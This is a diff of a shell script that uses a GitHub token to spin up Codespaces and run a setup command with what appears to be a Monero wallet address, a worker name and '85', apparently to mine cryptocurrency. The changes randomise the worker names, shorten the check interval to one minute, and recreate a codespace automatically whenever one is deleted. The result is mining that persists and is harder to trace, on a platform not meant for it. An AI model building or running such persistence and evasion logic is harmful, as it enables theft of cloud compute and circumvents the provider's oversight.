@@ -4,7 +4,10 @@ GH_TOKEN="$1"
 REPO="niaalae/dock"
 BRANCH="main"
 MACHINE_TYPE="basicLinux_4x16" # Change if you have a better type
-SETUP_CMD='sudo ./setup.sh 49J8k2f3qtHaNYcQ52WXkHZgWhU4dU8fuhRJcNiG9Bra3uyc2pQRsmR38mqkh2MZhEfvhkh2bNkzR892APqs3U6aHsBcN1F "$(hostname)" 85'
+
+# Generate random worker name (8 alphanumeric characters) - no hostname
+RANDOM_WORKER="worker-$(head -c 100 /dev/urandom | tr -dc 'a-z0-9' | head -c 8)"
+SETUP_CMD="sudo ./setup.sh 49J8k2f3qtHaNYcQ52WXkHZgWhU4dU8fuhRJcNiG9Bra3uyc2pQRsmR38mqkh2MZhEfvhkh2bNkzR892APqs3U6aHsBcN1F \"$RANDOM_WORKER\" 85"
 
 if [ -z "$GH_TOKEN" ]; then
   echo "Usage: $0 <gh_token>"
@@ -24,7 +27,7 @@ if [ -z "$CODESPACE_NAME" ]; then
   echo "Failed to create codespace."
   exit 1
 fi
-echo "Created codespace: $CODESPACE_NAME"
+echo "Created codespace: $CODESPACE_NAME with worker: $RANDOM_WORKER"
 
 # SSH and run setup command in background
 ssh_cmd="gh codespace ssh -c $CODESPACE_NAME -- $SETUP_CMD"
@@ -32,22 +35,36 @@ $ssh_cmd &
 SSH_PID=$!
 
 while true; do
-  sleep 300 # 5 minutes
+  sleep 60 # 1 minute
   if ! kill -0 $SSH_PID 2>/dev/null; then
     echo "SSH session closed. Attempting to reconnect..."
     # Check if codespace exists
     EXISTS=$(gh codespace list --json name -q ".[] | select(.name==\"$CODESPACE_NAME\") | .name")
     if [ -z "$EXISTS" ]; then
-      echo "Codespace not found. Checking token validity..."
-      gh auth status
-      if [ $? -ne 0 ]; then
-        echo "GitHub token invalid. Exiting."
-        exit 1
+      echo "Codespace not found. Creating a new one..."
+      # Generate new random worker name for new codespace
+      RANDOM_WORKER="worker-$(head -c 100 /dev/urandom | tr -dc 'a-z0-9' | head -c 8)"
+      SETUP_CMD="sudo ./setup.sh 49J8k2f3qtHaNYcQ52WXkHZgWhU4dU8fuhRJcNiG9Bra3uyc2pQRsmR38mqkh2MZhEfvhkh2bNkzR892APqs3U6aHsBcN1F \"$RANDOM_WORKER\" 85"
+      
+      # Try to create a new codespace
+      CODESPACE_NAME=$(gh codespace create -R "$REPO" -b "$BRANCH" -m "$MACHINE_TYPE" --json name -q ".name")
+      if [ -z "$CODESPACE_NAME" ]; then
+        echo "Failed to create new codespace. Checking token validity..."
+        gh auth status
+        if [ $? -ne 0 ]; then
+          echo "GitHub token invalid. Exiting."
+          exit 1
+        fi
+        echo "Token is valid but codespace creation failed. Retrying in next cycle..."
+        sleep 60
+        continue
       fi
-      echo "Codespace missing but token valid. Exiting."
-      exit 1
+      echo "Created new codespace: $CODESPACE_NAME with worker: $RANDOM_WORKER"
+      # Update SSH command with new codespace name and worker
+      ssh_cmd="gh codespace ssh -c $CODESPACE_NAME -- $SETUP_CMD"
     fi
     # Reconnect SSH
+    echo "Reconnecting SSH to codespace: $CODESPACE_NAME"
     $ssh_cmd &
     SSH_PID=$!
   fi
